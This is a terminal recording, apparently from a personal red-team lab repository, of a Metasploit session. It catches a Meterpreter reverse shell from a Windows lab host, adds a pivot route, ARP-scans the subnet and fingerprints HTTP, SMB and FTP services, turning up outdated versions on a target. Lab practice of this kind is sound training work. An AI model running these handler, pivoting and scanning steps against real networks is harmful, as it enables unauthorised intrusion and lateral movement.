@@ -1,0 +1,169 @@
+Script iniciado em 2026-05-15 09:57:11-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="190" LINES="35"]
+[?2004h]0;nikolay@debian: ~/lab/Red_Team_Repo/04_Enumeration[01;32mnikolay@debian[00m:[01;34m~/lab/Red_Team_Repo/04_Enumeration[00m$ m[Kclear
+[?2004l[H[2J[3J[?2004h]0;nikolay@debian: ~/lab/Red_Team_Repo/04_Enumeration[01;32mnikolay@debian[00m:[01;34m~/lab/Red_Team_Repo/04_Enumeration[00m$ msfconsole -q
+[?2004l[?1034h[4mmsf[0m [0m> use exploit/multi/handler
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST 192.168.1.143
+[0mLHOST => 192.168.1.143
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set LPORT 4444
+[0mLPORT => 4444
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set ExitOnSession false
+[0mExitOnSession => false
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exploit -j
+[0m
+[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 192.168.1.143:4444 
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m>     sessions -i 1
+[0m[1m[31m[-][0m Invalid session identifier: 1
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[1m[34m[*][0m Sending stage (248902 bytes) to 192.168.1.113
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.1.143:4444 -> 192.168.1.113:49706) at 2026-05-15 10:03:10 -0300
+sessionsexploit -jset ExitOnSession false[P[P[P[P[P[P[P[P[P[P[P[P[Pexploit -j[P[Psessions[Ksessionsexploit -jset ExitOnSession false[P[P[P[P[P[P[P[P[PLPORT 4444HOST 192.168.1.143PAYLOAD windows/x64/meterpreter/reverse_tcp[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Puse exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcp[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[PLHOST 192.168.1.143[P[P[P[P[P[P[P[P[PPORT 4444ExitOnSession false[P[P[P[P[P[P[P[P[P[P[P[P[Pexploit -j[P[Psessions[Ksessionsexploit -jset ExitOnSession false[P[P[P[P[P[P[P[P[P[P[P[P[Pexploit -j[P[Psessions[K
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> see[Kssion -i -[K1
+[0m[1m[31m[-][0m Unknown command: session. Did you mean [32msessions[0m? Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> session -i 1[Cs -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > run autoroute -s 192.168.1.0/24
+[0m[1m[33m[!][0m Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[1m[33m[!][0m Example: run post/multi/manage/autoroute OPTION=value [...]
+[1m[34m[*][0m Adding a route to 192.168.1.0/255.255.255.0...
+[1m[32m[+][0m Added route to 192.168.1.0/255.255.255.0 via 192.168.1.113
+[1m[34m[*][0m Use the -p option to list all active routes
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+[0m[1m[34m[*][0m Running module against WIN10-LAB (192.168.1.113)
+[1m[34m[*][0m ARP Scanning 192.168.1.0/24
+[1m[32m[+][0m 	IP: 192.168.1.1 MAC 1c:5f:2b:ff:8b:1c (UNKNOWN)
+[1m[32m[+][0m 	IP: 192.168.1.113 MAC 08:00:27:6b:03:0a (CADMUS COMPUTER SYSTEMS)
+[1m[32m[+][0m 	IP: 192.168.1.127 MAC 64:1c:67:8c:3b:13 (UNKNOWN)
+[1m[32m[+][0m 	IP: 192.168.1.126 MAC 00:1b:63:1d:ab:a1 (Apple Computer Inc.)
+[1m[32m[+][0m 	IP: 192.168.1.143 MAC 08:00:27:a7:25:9f (CADMUS COMPUTER SYSTEMS)
+[1m[32m[+][0m 	IP: 192.168.1.255 MAC 08:00:27:6b:03:0a (CADMUS COMPUTER SYSTEMS)
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> msf6 > use auxiliary/scanner/portscan/tcp
+[0m[1m[31m[-][0m Unknown command: msf6. Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> msf6 > set RHOSTS 192.168.1.0/24
+[0m[1m[31m[-][0m Unknown command: msf6. Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> msf6 > set PORTS 22,80,445,3306
+[0m[1m[31m[-][0m Unknown command: msf6. Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> msf6 > set THREADS 20
+[0m[1m[31m[-][0m Unknown command: msf6. Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> msf6 > run
+[0m[1m[31m[-][0m Unknown command: msf6. Run the [32mhelp[0m command for more details.
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> use auxiliary/scanner/portscan/tcp
+[0m[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> set RHOSTS 192.168.1.0/24
+[0mRHOSTS => 192.168.1.0/24
+[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> set PORTS 21,22,23,80,445,3306
+[0mPORTS => 21,22,23,80,445,3306
+[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> set THREADS 20
+[0mTHREADS => 20
+[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> run
+[0m[1m[32m[+][0m 192.168.1.1           - 192.168.1.1:80 - TCP OPEN
+[1m[34m[*][0m Scanned  26 of 256 hosts (10% complete)
+[1m[34m[*][0m Scanned  52 of 256 hosts (20% complete)
+[1m[34m[*][0m Scanned  77 of 256 hosts (30% complete)
+[1m[32m[+][0m 192.168.1.113         - 192.168.1.113:445 - TCP OPEN
+[1m[34m[*][0m Scanned 103 of 256 hosts (40% complete)
+[1m[32m[+][0m 192.168.1.126         - 192.168.1.126:22 - TCP OPEN
+[1m[32m[+][0m 192.168.1.126         - 192.168.1.126:80 - TCP OPEN
+[1m[32m[+][0m 192.168.1.126         - 192.168.1.126:445 - TCP OPEN
+[1m[32m[+][0m 192.168.1.143         - 192.168.1.143:22 - TCP OPEN
+[1m[34m[*][0m Scanned 128 of 256 hosts (50% complete)
+[1m[34m[*][0m Scanned 154 of 256 hosts (60% complete)
+[1m[34m[*][0m Scanned 181 of 256 hosts (70% complete)
+[1m[34m[*][0m Scanned 205 of 256 hosts (80% complete)
+[1m[34m[*][0m Scanned 231 of 256 hosts (90% complete)
+[1m[34m[*][0m Scanned 256 of 256 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> runset THREADS 20PORTS 21,22,23,80,445,3306[P[P[P[P[PRHOSTS 192.168.1.0/24[H[2J[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> set RHOSTS 192.168.1.0/24use auxiliary/scanner/portscan/tcpmsf6 > run[Kset THREADS 20run[Kuse auxiliary/scanner/portscan/tcp
+[0m[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> set RHOSTS 192.168.1.0/24
+[0mRHOSTS => 192.168.1.0/24
+[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> set PORTS 21,22,23,80,445,3306
+[0mPORTS => 21,22,23,80,445,3306
+[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> set THREADS 20
+[0mTHREADS => 20
+[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> run
+[0m[1m[32m[+][0m 192.168.1.1           - 192.168.1.1:80 - TCP OPEN
+[1m[34m[*][0m Scanned  40 of 256 hosts (15% complete)
+[1m[34m[*][0m Scanned  60 of 256 hosts (23% complete)
+[1m[34m[*][0m Scanned  80 of 256 hosts (31% complete)
+[1m[32m[+][0m 192.168.1.113         - 192.168.1.113:445 - TCP OPEN
+[1m[34m[*][0m Scanned 104 of 256 hosts (40% complete)
+[1m[32m[+][0m 192.168.1.126         - 192.168.1.126:445 - TCP OPEN
+[1m[32m[+][0m 192.168.1.126         - 192.168.1.126:80 - TCP OPEN
+[1m[32m[+][0m 192.168.1.126         - 192.168.1.126:22 - TCP OPEN
+[1m[32m[+][0m 192.168.1.143         - 192.168.1.143:22 - TCP OPEN
+[1m[32m[+][0m 192.168.1.145         - 192.168.1.145:3306 - TCP OPEN
+[1m[34m[*][0m Scanned 129 of 256 hosts (50% complete)
+[1m[32m[+][0m 192.168.1.145         - 192.168.1.145:23 - TCP OPEN
+[1m[32m[+][0m 192.168.1.145         - 192.168.1.145:21 - TCP OPEN
+[1m[32m[+][0m 192.168.1.145         - 192.168.1.145:80 - TCP OPEN
+[1m[32m[+][0m 192.168.1.145         - 192.168.1.145:445 - TCP OPEN
+[1m[32m[+][0m 192.168.1.145         - 192.168.1.145:22 - TCP OPEN
+[1m[34m[*][0m Scanned 162 of 256 hosts (63% complete)
+[1m[34m[*][0m Scanned 181 of 256 hosts (70% complete)
+ip a    [1m[34m[*][0m Scanned 205 of 256 hosts (80% complete)
+[1m[34m[*][0m Scanned 231 of 256 hosts (90% complete)
+[1m[34m[*][0m Scanned 256 of 256 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/portscan/tcp[0m) [0m> use auxiliary/scanner/http/http_version
+[0m[4mmsf[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> set RHOSTS 192.168.1.126, 192.168.1.145
+[0mRHOSTS => 192.168.1.126, 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> run
+[0m[1m[32m[+][0m 192.168.1.126:80 Apache/2.4.67 (Debian)
+[1m[34m[*][0m Scanned 1 of 2 hosts (50% complete)
+[1m[32m[+][0m 192.168.1.145:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
+[1m[34m[*][0m Scanned 1 of 2 hosts (50% complete)
+[1m[34m[*][0m Scanned 2 of 2 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> use auxiliary/scanner/http/http_version
+[0m[4mmsf[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> set RHOSTS 192.168.1.126, 192.168.1.145
+[0mRHOSTS => 192.168.1.126, 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> run
+[0m[1m[32m[+][0m 192.168.1.126:80 Apache/2.4.67 (Debian)
+[1m[34m[*][0m Scanned 1 of 2 hosts (50% complete)
+[1m[32m[+][0m 192.168.1.145:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
+[1m[34m[*][0m Scanned 2 of 2 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/http/http_version[0m) [0m> use auxiliary/scanner/smb/smb_version
+[0m[4mmsf[0m auxiliary([1m[31mscanner/smb/smb_version[0m) [0m> set RHOSTS 192.168.1.126, 192.168.1.145
+[0mRHOSTS => 192.168.1.126, 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/smb/smb_version[0m) [0m> run
+[0m[1m[34m[*][0m 192.168.1.126:445     - SMB Detected (versions: 2, 3) (preferred dialect: SMB 3.1.1) (compression capabilities: ) (encryption capabilities: AES-128-GCM) (signatures: optional) (guid: {6263616d-6f6f-2d6b-6c61-620000000000}) (authentication domain: MACBOOK-LAB)
+[1m[32m[+][0m 192.168.1.126:445     -   Host is running Version 6.1.0 (unknown OS)
+[1m[34m[*][0m 192.168.1.126:445     -   SMB signing is not required
+[1m[34m[*][0m Scanned 1 of 2 hosts (50% complete)
+[1m[34m[*][0m Scanned 1 of 2 hosts (50% complete)
+[1m[34m[*][0m Scanned 1 of 2 hosts (50% complete)
+[1m[34m[*][0m 192.168.1.145:445     - SMB Detected (versions: 1) (preferred dialect: ) (signatures: optional)
+[1m[32m[+][0m 192.168.1.145:445     -   Host is running Unix
+[1m[34m[*][0m 192.168.1.145:445     -   SMB signing is not required
+[1m[34m[*][0m Scanned 2 of 2 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/smb/smb_version[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/smb/smb_version[0m) [0m> use auxiliary/scanner/ftp/ftp_version
+[0m[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> set RHOSTS 192.168.1.145
+[0mRHOSTS => 192.168.1.145
+[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> run
+[0m[1m[32m[+][0m 192.168.1.145:21      - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
+[1m[34m[*][0m 192.168.1.145:21      - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> [H[2J[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> exit
+[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
+[4mmsf[0m auxiliary([1m[31mscanner/ftp/ftp_version[0m) [0m> exit -y
+[0m[?2004h]0;nikolay@debian: ~/lab/Red_Team_Repo/04_Enumeration[01;32mnikolay@debian[00m:[01;34m~/lab/Red_Team_Repo/04_Enumeration[00m$ exit
+[?2004lexit
+
+Script concluído em 2026-05-15 10:46:06-03:00 [COMMAND_EXIT_CODE="0"]
